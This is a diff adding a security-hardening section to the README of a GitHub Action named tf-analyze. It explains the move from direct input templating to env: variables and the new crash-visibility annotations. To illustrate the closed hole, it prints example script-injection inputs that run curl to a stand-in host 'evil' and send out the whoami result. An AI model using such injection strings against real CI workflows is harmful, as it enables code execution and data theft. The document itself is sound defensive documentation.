@@ -125,3 +125,68 @@ and would have failed on every CI run with
 `~/.tf-analyze/scripts/detect.py: No such file or directory`. The fix
 is in `main` from commit `be39331` onward; pin to `v0.2.1` or later
 for the corrected clone URL.
+
+## Round 30.12 hardening (script injection + engine-crash visibility)
+
+The R30.12 audit pass made two user-visible changes to the action's
+internals. **The input contract is unchanged** — the inputs table above
+still describes the same shape — but the implementation now:
+
+### Inputs flow through `env:` (script-injection boundary)
+
+Every user-supplied input (`fail-on`, `target`, `section`,
+`attack-graph`, `baseline`, `extra-args`) is now passed to the shell
+via `env:` rather than templated via `${{ inputs.X }}` directly into
+the script body. Why this matters: GitHub Actions templating performs
+string substitution into the YAML source **before** the shell or
+Python sees the script. A reusable workflow whose `fail-on` is supplied
+by an upstream caller (e.g. via `with:` from a third-party `uses:`
+block) could previously pass
+
+```yaml
+fail-on: '"); import os; os.system("curl evil/$(whoami)"); _ = ("'
+```
+
+and that string would land verbatim inside the Python heredoc, executing
+the injected code. The `env:` boundary makes the value reachable only
+via `os.environ` at runtime — no source-text substitution, no injection.
+
+The same fix applies to `extra-args`: where the array was previously
+built via `EXTRA=(${{ inputs.extra-args }})` (unquoted shell array
+literal — `$(curl evil)` in the input would execute when the array was
+parsed), it now uses `read -ra EXTRA <<<"${TFA_EXTRA_ARGS}"`. `read -ra`
+performs whitespace tokenisation but **not** command substitution, so a
+user passing `--extra-args "--foo $(curl evil) --bar"` gets four
+literal arguments and no shell-out.
+
+If you wrote a workflow that called this action directly with curated,
+trusted inputs (the common case), nothing changes. If you wrote a
+reusable workflow that exposed these inputs to untrusted callers, the
+injection surface is now closed.
+
+### Engine crashes surface as `::error::` annotations
+
+The previous `Run tf-analyze` step ended each format-specific scan
+invocation with `|| true` so the workflow could continue past a
+non-zero exit code (necessary because exit 1 = findings present, which
+is the expected case). The unintended consequence: a CRITICAL engine
+crash (OOM, segfault, signal 9 from a hung worker) returned exit
+≥ 2 and **was indistinguishable** from "scan succeeded, no findings."
+
+The new shape captures the exit code per format:
+
+| Exit code | Meaning | Action behaviour |
+|---|---|---|
+| `0` | Engine ran clean, no findings | Continue silently |
+| `1` | Engine ran clean, findings present | Continue (the PR comment surfaces them) |
+| `≥ 2` | Engine crashed | Emit `::error::tf-analyze: <fmt> scan crashed (exit N). See <stderr-file> for the engine traceback.` |
+
+The workflow still continues past the crash (the JSON-load step has a
+try/except that supplies zeroed defaults, so downstream steps run) but
+the `::error::` annotation makes the failure visible in the workflow
+status. Operators can no longer mistake a crashed engine for a clean
+scan.
+
+The per-format stderr files (`tf-analyze-json-stderr.txt`,
+`tf-analyze-sarif-stderr.txt`, etc.) are still collected and shown in
+collapsible groups in the workflow log.
